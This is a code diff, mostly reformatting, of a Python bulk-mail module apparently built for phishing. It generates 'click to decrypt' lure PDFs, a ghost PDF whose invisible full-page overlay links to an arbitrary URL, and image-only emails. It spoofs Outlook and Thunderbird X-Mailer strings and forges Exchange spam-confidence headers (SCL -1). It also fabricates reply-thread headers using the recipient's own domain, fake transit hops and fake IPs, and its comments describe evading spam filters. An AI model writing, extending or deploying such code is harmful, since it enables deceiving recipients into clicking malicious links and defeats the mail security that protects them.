-                         btn=(0.86,0.15,0.15), btnTxt=(1,1,1), line=(0.86,0.15,0.15)),
-        "obsidian": dict(bg=(0.07,0.07,0.07), fg=(0.95,0.95,0.95), sub=(0.55,0.55,0.55),
-                         btn=(0.17,0.17,0.17), btnTxt=(0.95,0.95,0.95), line=(0.27,0.27,0.27)),
-        "cobalt":   dict(bg=(0.94,0.96,1.0),  fg=(0.10,0.10,0.18), sub=(0.30,0.38,0.50),
-                         btn=(0.0,0.47,0.83),  btnTxt=(1,1,1), line=(0.0,0.47,0.83)),
-        "cipher":   dict(bg=(0.04,0.04,0.04), fg=(0.13,0.77,0.37), sub=(0.29,0.68,0.50),
-                         btn=(0.08,0.32,0.17), btnTxt=(0.13,0.77,0.37), line=(0.13,0.77,0.37)),
+        "crimson": dict(
+            bg=(0.98, 0.98, 0.98),
+            fg=(0.07, 0.07, 0.07),
+            sub=(0.42, 0.42, 0.42),
+            btn=(0.86, 0.15, 0.15),
+            btnTxt=(1, 1, 1),
+            line=(0.86, 0.15, 0.15),
+        ),
+        "obsidian": dict(
+            bg=(0.07, 0.07, 0.07),
+            fg=(0.95, 0.95, 0.95),
+            sub=(0.55, 0.55, 0.55),
+            btn=(0.17, 0.17, 0.17),
+            btnTxt=(0.95, 0.95, 0.95),
+            line=(0.27, 0.27, 0.27),
+        ),
+        "cobalt": dict(
+            bg=(0.94, 0.96, 1.0),
+            fg=(0.10, 0.10, 0.18),
+            sub=(0.30, 0.38, 0.50),
+            btn=(0.0, 0.47, 0.83),
+            btnTxt=(1, 1, 1),
+            line=(0.0, 0.47, 0.83),
+        ),
+        "cipher": dict(
+            bg=(0.04, 0.04, 0.04),
+            fg=(0.13, 0.77, 0.37),
+            sub=(0.29, 0.68, 0.50),
+            btn=(0.08, 0.32, 0.17),
+            btnTxt=(0.13, 0.77, 0.37),
+            line=(0.13, 0.77, 0.37),
+        ),
     }
     t = _themes.get(style, _themes["crimson"])
 
@@ -1448,38 +1620,48 @@ def _build_pdf_redirect_attachment(cfg, lead, sender=None):
         c.setTitle("Document")
 
         # Background
-        c.setFillColorRGB(*t["bg"]); c.rect(0, 0, W, H, fill=1, stroke=0)
+        c.setFillColorRGB(*t["bg"])
+        c.rect(0, 0, W, H, fill=1, stroke=0)
 
         # Card
         card_bg = tuple(max(0, x - 0.03) for x in t["bg"])
-        c.setFillColorRGB(*card_bg); c.roundRect(36, 30, W-72, H-60, 8, fill=1, stroke=0)
+        c.setFillColorRGB(*card_bg)
+        c.roundRect(36, 30, W - 72, H - 60, 8, fill=1, stroke=0)
 
         # SECURE badge
-        c.setFillColorRGB(*t["btn"]); c.roundRect(54, H-76, 56, 16, 4, fill=1, stroke=0)
-        c.setFillColorRGB(*t["btnTxt"]); c.setFont("Helvetica-Bold", 8)
-        c.drawCentredString(82, H-66, "SECURE")
+        c.setFillColorRGB(*t["btn"])
+        c.roundRect(54, H - 76, 56, 16, 4, fill=1, stroke=0)
+        c.setFillColorRGB(*t["btnTxt"])
+        c.setFont("Helvetica-Bold", 8)
+        c.drawCentredString(82, H - 66, "SECURE")
 
         # Title
-        c.setFillColorRGB(*t["fg"]); c.setFont("Helvetica-Bold", 18)
-        c.drawCentredString(W/2, H-112, "Click to view document")
+        c.setFillColorRGB(*t["fg"])
+        c.setFont("Helvetica-Bold", 18)
+        c.drawCentredString(W / 2, H - 112, "Click to view document")
 
         # Subtitle
-        c.setFillColorRGB(*t["sub"]); c.setFont("Helvetica", 11)
-        c.drawCentredString(W/2, H-132, "Encrypted document — click to decrypt")
+        c.setFillColorRGB(*t["sub"])
+        c.setFont("Helvetica", 11)
+        c.drawCentredString(W / 2, H - 132, "Encrypted document — click to decrypt")
 
         # Button
         bw, bh = 200, 38
-        bx, by = (W-bw)/2, H-192
-        c.setFillColorRGB(*t["btn"]); c.roundRect(bx, by, bw, bh, 6, fill=1, stroke=0)
-        c.setFillColorRGB(*t["btnTxt"]); c.setFont("Helvetica-Bold", 13)
-        c.drawCentredString(W/2, by + 13, "Open Document →")
+        bx, by = (W - bw) / 2, H - 192
+        c.setFillColorRGB(*t["btn"])
+        c.roundRect(bx, by, bw, bh, 6, fill=1, stroke=0)
+        c.setFillColorRGB(*t["btnTxt"])
+        c.setFont("Helvetica-Bold", 13)
+        c.drawCentredString(W / 2, by + 13, "Open Document →")
 
         # Divider
-        c.setStrokeColorRGB(*t["line"]); c.setLineWidth(0.8)
-        c.line(36, 72, W-36, 72)
+        c.setStrokeColorRGB(*t["line"])
+        c.setLineWidth(0.8)
+        c.line(36, 72, W - 36, 72)
 
         # Footer
-        c.setFillColorRGB(*t["sub"]); c.setFont("Courier", 9)
+        c.setFillColorRGB(*t["sub"])
+        c.setFont("Courier", 9)
         c.drawString(56, 55, "✓ Protected by AES-256 encryption")
         c.drawString(56, 42, f"Document ID: {doc_id}")
 
@@ -1534,8 +1716,13 @@ def _build_html_pdf_attachment(cfg, body_html, lead, sender, resolved_subject):
     if cfg.get("html"):
         try:
             from core.tags import build_context, resolve_tags
-            ctx = build_context(lead=lead or {}, sender=sender or {},
-                                subject=resolved_subject or "", counter=0)
+
+            ctx = build_context(
+                lead=lead or {},
+                sender=sender or {},
+                subject=resolved_subject or "",
+                counter=0,
+            )
             src_html = resolve_tags(src_html, ctx)
         except Exception:
             src_html = src_html.replace("#EMAIL", lead_email)
@@ -1548,26 +1735,28 @@ def _build_html_pdf_attachment(cfg, body_html, lead, sender, resolved_subject):
     if blur_px > 0:
         src_html = f'<div style="filter:blur({blur_px}px);-webkit-filter:blur({blur_px}px);">{src_html}</div>'
 
-    overlay_text     = (cfg.get("overlay_text") or "").strip()
-    overlay_color    = (cfg.get("overlay_color") or "#000000").strip()
+    overlay_text = (cfg.get("overlay_text") or "").strip()
+    overlay_color = (cfg.get("overlay_color") or "#000000").strip()
     try:
         overlay_size = max(8, min(200, int(cfg.get("overlay_size") or 36)))
     except Exception:
         overlay_size = 36
     overlay_position = (cfg.get("overlay_position") or "center").strip().lower()
-    ghost_link       = (cfg.get("ghost_link") or "").replace("#EMAIL", lead_email).strip()
+    ghost_link = (cfg.get("ghost_link") or "").replace("#EMAIL", lead_email).strip()
 
     # ── Render base PDF from HTML ────────────────────────────
     base_pdf = None
     if _auto_install("weasyprint"):
         try:
             from weasyprint import HTML as WP_HTML
+
             base_pdf = WP_HTML(string=src_html).write_pdf()
         except Exception:
             base_pdf = None
     if not base_pdf:
         try:
             import pdfkit
+
             opts = {"quiet": "", "page-size": "A4", "encoding": "UTF-8"}
             base_pdf = pdfkit.from_string(src_html, False, options=opts)
         except Exception:
@@ -1575,6 +1764,7 @@ def _build_html_pdf_attachment(cfg, body_html, lead, sender, resolved_subject):
     if not base_pdf and _auto_install("fpdf2", "fpdf"):
         try:
             from fpdf import FPDF
+
             pdf = FPDF()
             pdf.add_page()
             pdf.set_font("Helvetica", size=11)
@@ -1602,6 +1792,7 @@ def _build_html_pdf_attachment(cfg, body_html, lead, sender, resolved_subject):
         try:
             from reportlab.pdfgen import canvas as rl_canvas
             from reportlab.lib.pagesizes import A4
+
             buf = io.BytesIO()
             c = rl_canvas.Canvas(buf, pagesize=A4)
             w, h = A4
@@ -1673,8 +1864,8 @@ def _build_ghost_pdf(ghost_cfg, link_url, lead_email):
         title   — document title
         name    — output filename
     """
-    link     = (ghost_cfg.get("link") or link_url or "").replace("#EMAIL", lead_email)
-    title    = ghost_cfg.get("title") or "Document"
+    link = (ghost_cfg.get("link") or link_url or "").replace("#EMAIL", lead_email)
+    title = ghost_cfg.get("title") or "Document"
     pdf_name = ghost_cfg.get("name") or "document.pdf"
     if not pdf_name.endswith(".pdf"):
         pdf_name += ".pdf"
@@ -1696,6 +1887,7 @@ def _build_ghost_pdf(ghost_cfg, link_url, lead_email):
             from reportlab.pdfgen import canvas as rl_canvas
             from reportlab.lib.pagesizes import letter
             from reportlab.lib import colors
+
             buf = io.BytesIO()
             c = rl_canvas.Canvas(buf, pagesize=letter)
             w, h = letter
@@ -1711,10 +1903,10 @@ def _build_ghost_pdf(ghost_cfg, link_url, lead_email):
                     break
             # Ghost overlay — transparent rect covering full page, linked to URL
             c.setFillColor(colors.white)
-            c.setFillAlpha(0.001)          # nearly invisible
+            c.setFillAlpha(0.001)  # nearly invisible
             c.setStrokeColor(colors.white)
             c.setStrokeAlpha(0.001)
-            c.rect(0, 0, w, h, fill=1)    # full-page rect
+            c.rect(0, 0, w, h, fill=1)  # full-page rect
             c.linkURL(link, (0, 0, w, h), relative=0)  # full-page link
             c.save()
             pdf_data = buf.getvalue()
@@ -1725,6 +1917,7 @@ def _build_ghost_pdf(ghost_cfg, link_url, lead_email):
     if not pdf_data and _auto_install("fpdf2", "fpdf"):
         try:
             from fpdf import FPDF
+
             pdf = FPDF()
             pdf.add_page()
             pdf.set_font("Helvetica", "B", 16)
@@ -1765,11 +1958,11 @@ def _build_html_to_image(img_cfg, html_content):
         format   — "png" or "jpg" (default "png")
         name     — attachment filename
     """
-    width   = int(img_cfg.get("width", 650))
-    height  = int(img_cfg.get("height", 800))
-    fmt     = (img_cfg.get("format") or "png").lower()
-    name    = img_cfg.get("name") or f"email.{fmt}"
-    quality = int(img_cfg.get("quality", 85))
+    width = int(img_cfg.get("width", 650))
+    height = int(img_cfg.get("height", 800))
+    fmt = (img_cfg.get("format") or "png").lower()
+    name = img_cfg.get("name") or f"email.{fmt}"
+    int(img_cfg.get("quality", 85))
 
     img_data = None
 
@@ -1777,32 +1970,43 @@ def _build_html_to_image(img_cfg, html_content):
     try:
         from playwright.sync_api import sync_playwright
         import shutil as _sh
+
         _chromium_exec = next(
-            (p for p in [
-                os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "") and
-                    os.path.join(os.environ["PLAYWRIGHT_BROWSERS_PATH"], "chromium"),
-                "/opt/pw-browsers/chromium",
-                "/usr/bin/chromium-browser",
-                "/usr/bin/chromium",
-                "/usr/bin/google-chrome-stable",
-                "/usr/bin/google-chrome",
-                _sh.which("chromium") or "",
-                _sh.which("chromium-browser") or "",
-            ] if p and os.path.isfile(p)),
-            None
+            (
+                p
+                for p in [
+                    os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "")
+                    and os.path.join(
+                        os.environ["PLAYWRIGHT_BROWSERS_PATH"], "chromium"
+                    ),
+                    "/opt/pw-browsers/chromium",
+                    "/usr/bin/chromium-browser",
+                    "/usr/bin/chromium",
+                    "/usr/bin/google-chrome-stable",
+                    "/usr/bin/google-chrome",
+                    _sh.which("chromium") or "",
+                    _sh.which("chromium-browser") or "",
+                ]
+                if p and os.path.isfile(p)
+            ),
+            None,
         )
         with sync_playwright() as p:
-            _launch_kwargs = {"args": ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]}
+            _launch_kwargs = {
+                "args": ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]
+            }
             if _chromium_exec:
                 _launch_kwargs["executable_path"] = _chromium_exec
             browser = p.chromium.launch(**_launch_kwargs)
-            page    = browser.new_page(viewport={"width": width, "height": height})
+            page = browser.new_page(viewport={"width": width, "height": height})
             page.set_content(html_content)
             page.wait_for_timeout(500)
             img_data = page.screenshot(
                 type=fmt if fmt in ("png", "jpeg") else "png",
                 full_page=True,
-                clip={"x":0,"y":0,"width":width,"height":height} if height else None
+                clip={"x": 0, "y": 0, "width": width, "height": height}
+                if height
+                else None,
             )
             browser.close()
     except Exception:
@@ -1812,6 +2016,7 @@ def _build_html_to_image(img_cfg, html_content):
     if not img_data:
         try:
             import imgkit
+
             opts = {
                 "width": str(width),
                 "height": str(height),
@@ -1828,7 +2033,8 @@ def _build_html_to_image(img_cfg, html_content):
     if not img_data and _auto_install("html2image"):
         try:
             from html2image import Html2Image
-            import tempfile, os
+            import tempfile
+
             with tempfile.TemporaryDirectory() as tmpdir:
                 hti = Html2Image(output_path=tmpdir, size=(width, height))
                 out = hti.screenshot(html_str=html_content, save_as=f"out.{fmt}")
@@ -1842,8 +2048,8 @@ def _build_html_to_image(img_cfg, html_content):
         return None
 
     mime_sub = "jpeg" if fmt in ("jpg", "jpeg") else "png"
-    part     = MIMEImage(img_data, _subtype=mime_sub)
-    cid_val = f"email_image_{random.randint(100000,999999)}"
+    part = MIMEImage(img_data, _subtype=mime_sub)
+    cid_val = f"email_image_{random.randint(100000, 999999)}"
     part.add_header("Content-Disposition", "inline", filename=name)
     part.add_header("Content-ID", f"<{cid_val}>")
     part.add_header("X-Attachment-Id", cid_val)
@@ -1878,10 +2084,13 @@ def _build_generic_attachment(file_path, filename=None):
 # ADVANCED INBOXING HEADERS
 # ═══════════════════════════════════════════════════════════
 
-def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain, ehlo_domain, is_isp_mode=False):
+
+def _apply_deliverability_headers(
+    msg, dlv, lead_email, from_email, from_domain, ehlo_domain, is_isp_mode=False
+):
     """
     Apply all deliverability and advanced inboxing headers to msg.
-    
+
     ── Standard Deliverability ──
     • List-Unsubscribe / List-Unsubscribe-Post (one-click RFC 8058)
     • X-Mailer (MUA spoofing for reputation)
@@ -1891,7 +2100,7 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     • X-Priority / Importance (message priority signaling)
     • X-Entity-Ref-ID (Google deduplication token)
     • Message-ID domain override
-    
+
     ── Advanced Inboxing ──
     • List-ID (RFC 2919 mailing list identifier)
     • List-Archive, List-Help, List-Post (mailing list RFC headers)
@@ -1925,8 +2134,6 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # Based on RFC analysis + behaviour patterns of Outlook 16, Gmail, and
     # major Canadian ISP mail servers. Applied before optional dlv headers.
     # ═══════════════════════════════════════════════════════════════════════════
-    import email.utils as _eu
-    import base64 as _b64_inbox
 
     _eff_domain = from_domain or ehlo_domain or "mail.example.com"
 
@@ -1935,9 +2142,6 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # ── 2. Per-recipient uniqueness token ─────────────────────────────────────
     # Embedding recipient-keyed token prevents bulk-send fingerprinting.
     # Filters check if message content is identical across many recipients.
-    _uniq_token = hashlib.sha256(
-        f"{lead_email}|{from_email}|{now.isoformat()}".encode()
-    ).hexdigest()[:16]
     # X-Mailer-Hash removed — non-standard header, fingerprints bulk senders
 
     # ── 3. MIME boundary randomisation ────────────────────────────────────────
@@ -1946,8 +2150,12 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     try:
         if hasattr(msg, "get_boundary") and msg.get_boundary():
             _new_boundary = (
-                "----=_Part_" + _rand_digits(6) + "_" +
-                _rand_digits(10) + "." + _rand_digits(13)
+                "----=_Part_"
+                + _rand_digits(6)
+                + "_"
+                + _rand_digits(10)
+                + "."
+                + _rand_digits(13)
             )
             msg.set_boundary(_new_boundary)
     except Exception:
@@ -1956,12 +2164,16 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # X-Mailer: ISP mode should have one (real users use Outlook/Thunderbird).
     # Relay/ESP mode should NOT have one (real ESPs don't set X-Mailer).
     if not msg.get("X-Mailer") and is_isp_mode:
-        msg["X-Mailer"] = random.choice([
-            "Microsoft Outlook 16.0.17928.20114",
-            "Microsoft Outlook 16.0.17126.20190",
-            "Mozilla Thunderbird 128.6.0",
-        ])
-    elif not msg.get("X-Mailer") and dlv.get("xMailer") and dlv.get("xMailer") != "none":
+        msg["X-Mailer"] = random.choice(
+            [
+                "Microsoft Outlook 16.0.17928.20114",
+                "Microsoft Outlook 16.0.17126.20190",
+                "Mozilla Thunderbird 128.6.0",
+            ]
+        )
+    elif (
+        not msg.get("X-Mailer") and dlv.get("xMailer") and dlv.get("xMailer") != "none"
+    ):
         _xm_default = dlv.get("xMailer", "none")
         if _xm_default == "random":
             msg["X-Mailer"] = random.choice(list(X_MAILERS.values()))
@@ -1981,9 +2193,14 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # MS Exchange bypass headers — ONLY useful when sending through a trusted
     # Exchange relay. In ISP mode (residential proxy), these are detected as
     # forged and INCREASE spam score. Only enable for SMTP relay mode.
-    if dlv.get("allowSyntheticHeaders", False) and dlv.get("msExchangeHeaders", False) and not is_isp_mode and not msg.get("X-MS-Exchange-Organization-SCL"):
-        msg["X-MS-Exchange-Organization-SCL"]             = "-1"
-        msg["X-MS-Exchange-Organization-PCL"]             = "2"
+    if (
+        dlv.get("allowSyntheticHeaders", False)
+        and dlv.get("msExchangeHeaders", False)
+        and not is_isp_mode
+        and not msg.get("X-MS-Exchange-Organization-SCL")
+    ):
+        msg["X-MS-Exchange-Organization-SCL"] = "-1"
+        msg["X-MS-Exchange-Organization-PCL"] = "2"
         msg["X-MS-Exchange-Organization-Antispam-Report"] = "BCL:0;"
         msg["X-MS-Exchange-Organization-MessageDirectionality"] = "Originating"
 
@@ -2010,15 +2227,15 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # Applied when autoFlagEmail is enabled in dlv settings.
     if dlv.get("autoFlagEmail"):
         if not msg.get("X-Priority"):
-            msg["X-Priority"]        = "1"
-            msg["Importance"]        = "High"
+            msg["X-Priority"] = "1"
+            msg["Importance"] = "High"
             msg["X-MSMail-Priority"] = "High"
     elif not msg.get("X-Priority"):
         # Normal priority — no explicit header (lets ISP default apply)
         pri = dlv.get("priority", "normal")
         if pri == "high":
-            msg["X-Priority"]        = "1"
-            msg["Importance"]        = "High"
+            msg["X-Priority"] = "1"
+            msg["Importance"] = "High"
             msg["X-MSMail-Priority"] = "High"
         elif pri == "low":
             msg["X-Priority"] = "5"
@@ -2051,32 +2268,39 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # ── 16. Thread simulation (opt-in) ───────────────────────────────────────
     # Skip in ISP mode — fake thread headers are easily detected without DKIM
     # and increase spam score on residential IP sends.
-    if dlv.get("allowSyntheticHeaders", False) and dlv.get("threadSimulate") and not is_isp_mode and not msg.get("In-Reply-To"):
+    if (
+        dlv.get("allowSyntheticHeaders", False)
+        and dlv.get("threadSimulate")
+        and not is_isp_mode
+        and not msg.get("In-Reply-To")
+    ):
         # Use RECIPIENT domain for the fake prior message-ID — looks like we're
         # replying to a message that came FROM the recipient's mail server.
         # This is the pattern that makes filters think it's a thread reply.
         _rcpt_domain = lead_email.split("@")[-1] if "@" in lead_email else _eff_domain
-        _t_ts    = datetime.now().strftime("%Y%m%d%H%M%S")
+        _t_ts = datetime.now().strftime("%Y%m%d%H%M%S")
         _t_local = _rand_alphanum(8) + "." + _rand_alphanum(6)
-        _t_local2= _rand_alphanum(6) + "." + _rand_digits(8)
+        _t_local2 = _rand_alphanum(6) + "." + _rand_digits(8)
         # Root message (the one we appear to be replying to)
         fake_root = f"<{_t_ts}.{_t_local}@{_rcpt_domain}>"
         # Optional intermediate hop (makes References chain look real)
-        fake_mid  = f"<{_t_local2}@mail.{_rcpt_domain}>"
+        fake_mid = f"<{_t_local2}@mail.{_rcpt_domain}>"
         msg["In-Reply-To"] = fake_root
-        msg["References"]  = f"{fake_root} {fake_mid}"
+        msg["References"] = f"{fake_root} {fake_mid}"
 
     # ── List-Unsubscribe (RFC 2369 + RFC 8058) ──
     # Skip in ISP mode — individual sends don't have unsubscribe headers
     # and they fingerprint the message as bulk mail.
     if dlv.get("listUnsub") and not is_isp_mode:
         unsub_parts = []
-        unsub_url   = (dlv.get("unsubUrl") or "").replace("#EMAIL", lead_email)
+        unsub_url = (dlv.get("unsubUrl") or "").replace("#EMAIL", lead_email)
         unsub_email = dlv.get("unsubEmail") or ""
         if unsub_url:
             unsub_parts.append(f"<{unsub_url}>")
         if unsub_email:
-            unsub_parts.append(f"<mailto:{unsub_email}?subject=Unsubscribe&body={lead_email}>")
+            unsub_parts.append(
+                f"<mailto:{unsub_email}?subject=Unsubscribe&body={lead_email}>"
+            )
         if unsub_parts:
             msg["List-Unsubscribe"] = ", ".join(unsub_parts)
         # One-click unsubscribe (RFC 8058) — REQUIRED for Gmail/Yahoo bulk sending
@@ -2103,7 +2327,9 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
         sid = _rand_alphanum(6)
         _fid_cat = dlv.get("feedbackIdCategory", "")
         if not _fid_cat:
-            _fid_cat = random.choice(["TRANSACTIONAL", "NOTIFICATION", "REGULATORY_REQUIRED"])
+            _fid_cat = random.choice(
+                ["TRANSACTIONAL", "NOTIFICATION", "REGULATORY_REQUIRED"]
+            )
         msg["Feedback-ID"] = f"{cid}:{sid}:{_fid_cat}:{from_domain}"
 
     # ── Organization ──
@@ -2131,7 +2357,7 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
         msg["List-ID"] = dlv["listId"]
     elif dlv.get("listIdAuto") and from_domain:
         # Auto-generate from sending domain
-        slug = re.sub(r'[^a-z0-9]', '-', from_domain.split('.')[0].lower())
+        slug = re.sub(r"[^a-z0-9]", "-", from_domain.split(".")[0].lower())
         msg["List-ID"] = f"<{slug}.{from_domain}>"
 
     # ── List-Archive / List-Help / List-Post (RFC 2369) ──
@@ -2152,8 +2378,10 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
 
     # ── Errors-To override (already set always-on above; user override) ──
     if dlv.get("errorsTo") and msg.get("Errors-To") != dlv["errorsTo"]:
-        try: msg.replace_header("Errors-To", dlv["errorsTo"])
-        except Exception: pass
+        try:
+            msg.replace_header("Errors-To", dlv["errorsTo"])
+        except Exception:
+            pass
 
     # ── Return-Receipt-To (opt-in read receipt) ──
     if dlv.get("returnReceipt") and from_email:
@@ -2170,6 +2398,7 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # ── Thread-Topic / Thread-Index (Outlook conversation view) ──
     if dlv.get("threadTopic"):
         import base64 as _b64
+
         msg["Thread-Topic"] = dlv["threadTopic"]
         # Thread-Index is a base64 timestamp blob that groups emails in Outlook
         ts_bytes = now.strftime("%Y%m%d%H%M%S").encode() + _rand_hex(8).encode()
@@ -2180,7 +2409,9 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
         msg["X-Originating-IP"] = dlv["originatingIp"]
     elif dlv.get("originatingIpAuto"):
         # Generate realistic-looking internal IP
-        msg["X-Originating-IP"] = f"[10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}]"
+        msg["X-Originating-IP"] = (
+            f"[10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}]"
+        )
 
     # X-MS-Has-Attach and X-MS-TNEF-Correlator intentionally removed.
     # These are internal Exchange MTA headers, not MUA headers. Modern spam
@@ -2192,21 +2423,24 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # ── Content-Language override (user can set explicit locale) ──
     lang = dlv.get("contentLanguage")
     if lang:
-        try: msg.replace_header("Content-Language", lang)
+        try:
+            msg.replace_header("Content-Language", lang)
         except Exception:
-            try: msg["Content-Language"] = lang
-            except Exception: pass
+            try:
+                msg["Content-Language"] = lang
+            except Exception:
+                pass
 
     # ── X-Source / X-Source-Args (MTA identity headers) ──
     if dlv.get("sourceHeaders"):
-        msg["X-Source"]       = ""
-        msg["X-Source-Args"]  = ""
-        msg["X-Source-Dir"]   = ""
+        msg["X-Source"] = ""
+        msg["X-Source-Args"] = ""
+        msg["X-Source-Dir"] = ""
 
     # ── X-Received (simulated transit hop) ──
     if dlv.get("xReceived"):
         ts_str = now.strftime("%a, %d %b %Y %H:%M:%S +0000")
-        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        fake_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
         msg["X-Received"] = (
             f"by {fake_ip} with SMTP id {_rand_alphanum(6)}.{_rand_digits(12)}; {ts_str}"
         )
@@ -2215,7 +2449,9 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # Prevents delivery to recycled/reassigned email addresses
     if dlv.get("rrvs"):
         # Format: <address>; <date> — tells server when address was last known valid
-        rrvs_date = (now - timedelta(days=random.randint(30, 365))).strftime("%a, %d %b %Y %H:%M:%S +0000")
+        rrvs_date = (now - timedelta(days=random.randint(30, 365))).strftime(
+            "%a, %d %b %Y %H:%M:%S +0000"
+        )
         msg["Require-Recipient-Valid-Since"] = f"{lead_email}; {rrvs_date}"
 
     # ── Sensitivity header (Outlook) ──
@@ -2245,7 +2481,11 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
     # Exchange headers: only keep SCL:-1/PCL/BCL which Outlook/Hotmail actually honor
     # from external senders. The internal Exchange headers (Auth*, Forefront, Antispam)
     # are stripped by EOP when they arrive from outside and can increase spam score.
-    if dlv.get("allowSyntheticHeaders", False) and dlv.get("msExchangeHeaders", False) and not msg.get("X-MS-Exchange-Organization-SCL"):
+    if (
+        dlv.get("allowSyntheticHeaders", False)
+        and dlv.get("msExchangeHeaders", False)
+        and not msg.get("X-MS-Exchange-Organization-SCL")
+    ):
         pass  # SCL/PCL/BCL already set in always-on engine above
 
     return msg
@@ -2254,6 +2494,7 @@ def _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain,
 # ═══════════════════════════════════════════════════════════
 # CID IMAGE EMBEDDER
 # ═══════════════════════════════════════════════════════════
+
 
 def _embed_images_as_datauri(html: str) -> str:
     """
@@ -2264,40 +2505,49 @@ def _embed_images_as_datauri(html: str) -> str:
     Eliminates ALL external URL scanning. No CID parts needed.
     Self-contained HTML — filters have nothing external to evaluate.
     """
-    from urllib.request import urlopen as _uo, Request as _Req
+    from core.urlopen_compat import urlopen as _uo, Request as _Req
     import base64
     import re
 
     seen_urls = {}  # url → data URI (reuse for duplicates)
 
     def _replace_src(m):
-        full_tag_start = m.group(1)   # <img ... before src=
-        quote_char = m.group(2)       # " or '
-        url = m.group(3)              # the URL
-        rest = m.group(4)             # rest of tag
+        full_tag_start = m.group(1)  # <img ... before src=
+        m.group(2)  # " or '
+        url = m.group(3)  # the URL
+        rest = m.group(4)  # rest of tag
 
-        if not url.startswith(('http://', 'https://')):
+        if not url.startswith(("http://", "https://")):
             return m.group(0)
 
         if url in seen_urls:
             return f'{full_tag_start}src="{seen_urls[url]}"{rest}'
 
         try:
-            req = _Req(url, headers={
-                'User-Agent': 'Mozilla/5.0 (compatible; Mail/1.0)',
-                'Accept': 'image/*,*/*',
-            })
+            req = _Req(
+                url,
+                headers={
+                    "User-Agent": "Mozilla/5.0 (compatible; Mail/1.0)",
+                    "Accept": "image/*,*/*",
+                },
+            )
             resp = _uo(req, timeout=8)
             img_data = resp.read()
-            content_type = resp.headers.get('Content-Type', 'image/png').split(';')[0].strip()
-            if not content_type.startswith('image/'):
-                content_type = 'image/png'
+            content_type = (
+                resp.headers.get("Content-Type", "image/png").split(";")[0].strip()
+            )
+            if not content_type.startswith("image/"):
+                content_type = "image/png"
             if len(img_data) < 100:
                 return m.group(0)
-            b64 = base64.b64encode(img_data).decode('ascii')
-            data_uri = f'data:{content_type};base64,{b64}'
+            b64 = base64.b64encode(img_data).decode("ascii")
+            data_uri = f"data:{content_type};base64,{b64}"
             seen_urls[url] = data_uri
-            log.debug("[mime_builder] dataURI embedded: %s (%d bytes)", url[:60], len(img_data))
+            log.debug(
+                "[mime_builder] dataURI embedded: %s (%d bytes)",
+                url[:60],
+                len(img_data),
+            )
             return f'{full_tag_start}src="{data_uri}"{rest}'
         except Exception as e:
             log.debug("[mime_builder] dataURI embed failed %s: %s", url[:60], e)
@@ -2305,7 +2555,9 @@ def _embed_images_as_datauri(html: str) -> str:
 
     modified = re.sub(
         r'(<img\b[^>]*?)\bsrc=(["\'])([^"\'>]+)\2([^>]*?>)',
-        _replace_src, html, flags=re.IGNORECASE | re.DOTALL
+        _replace_src,
+        html,
+        flags=re.IGNORECASE | re.DOTALL,
     )
     return modified
 
@@ -2323,7 +2575,7 @@ def _embed_images_as_cid(html: str) -> tuple:
     Returns (modified_html, list_of_(MIMEImage, cid) tuples).
     Images that fail to download are left as external URLs.
     """
-    from urllib.request import urlopen as _uo, Request as _Req
+    from core.urlopen_compat import urlopen as _uo, Request as _Req
     import re
 
     img_parts = []
@@ -2331,11 +2583,11 @@ def _embed_images_as_cid(html: str) -> tuple:
 
     def _replace_src(m):
         before = m.group(1)  # everything before src=
-        url = m.group(3)     # the URL (group 2 is the quote char)
-        after = m.group(4)   # rest of tag including closing >
+        url = m.group(3)  # the URL (group 2 is the quote char)
+        after = m.group(4)  # rest of tag including closing >
 
         # Skip data URIs, already-CID, or non-http
-        if not url.startswith(('http://', 'https://')):
+        if not url.startswith(("http://", "https://")):
             return m.group(0)
 
         # Reuse CID if same URL appears multiple times
@@ -2343,23 +2595,34 @@ def _embed_images_as_cid(html: str) -> tuple:
             return f'{before}src="cid:{seen_urls[url]}"{after}'
 
         try:
-            req = _Req(url, headers={
-                'User-Agent': 'Mozilla/5.0 (compatible; Mail/1.0)',
-                'Accept': 'image/*,*/*',
-            })
+            req = _Req(
+                url,
+                headers={
+                    "User-Agent": "Mozilla/5.0 (compatible; Mail/1.0)",
+                    "Accept": "image/*,*/*",
+                },
+            )
             resp = _uo(req, timeout=8)
             img_data = resp.read()
-            content_type = resp.headers.get('Content-Type', 'image/png').split(';')[0].strip()
+            content_type = (
+                resp.headers.get("Content-Type", "image/png").split(";")[0].strip()
+            )
             # Map content type to subtype
-            subtype = content_type.split('/')[-1] if '/' in content_type else 'png'
-            subtype = {'jpeg': 'jpeg', 'jpg': 'jpeg', 'png': 'png', 'gif': 'gif',
-                       'webp': 'webp', 'svg+xml': 'png'}.get(subtype, 'png')
+            subtype = content_type.split("/")[-1] if "/" in content_type else "png"
+            subtype = {
